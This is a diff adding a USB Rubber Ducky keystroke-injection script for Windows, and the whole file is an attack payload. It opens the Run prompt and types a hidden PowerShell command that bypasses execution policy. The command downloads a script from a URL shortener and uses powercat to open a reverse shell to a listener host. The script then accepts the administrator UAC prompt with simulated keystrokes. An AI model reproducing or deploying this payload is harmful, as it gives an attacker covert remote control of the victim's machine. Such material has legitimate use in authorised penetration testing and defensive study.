@@ -1,0 +1,15 @@
+REM This first delay stalls the Ducky for 5.5 seconds to give the target
+REM operating system some time to mount the USB as a keyboard device.
+DELAY 5500
+REM Opens the Windows Run prompt.
+GUI r
+REM Delays .7 seconds to give the Run prompt time to open.
+DELAY 700
+REM Types the PowerShell payload.
+STRING powershell /w 1 /C $a=$env:TEMP;Set-ExecutionPolicy Bypass;wget https://cutt.ly/cW13i -o $a\d.ps1;ipmo $a\d.ps1;powercat -c LISTNERIP -p LISTNERPORT -e powershell
+REM Presses Ctrl + Shirt + Enter to execute the PowerShell with administrative privileges.
+CTRL-SHIFT ENTER
+REM Delay .85 seconds to give the UAC prompt time to open.
+DELAY 850
+REM Presses Alt + Y to bypass UAC.
+ALT y
